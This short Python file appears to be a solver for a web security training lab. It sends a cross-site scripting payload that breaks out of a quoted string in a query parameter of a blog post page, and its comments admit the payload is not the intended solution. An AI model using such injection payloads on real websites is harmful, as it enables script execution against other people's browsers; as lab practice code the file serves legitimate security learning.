from web_security_academy.core.logger import logger


# Todo: Find the real solution
def solve_lab(session):
    # Solves lab, but doesn't alert(1337)...
    xss = "',a:valueOf=alert,b:window+'"
    path = f"/post?postId=1&xss={xss}"
    session.get_path(path)
    logger.info(f'Visited path "{path}"')
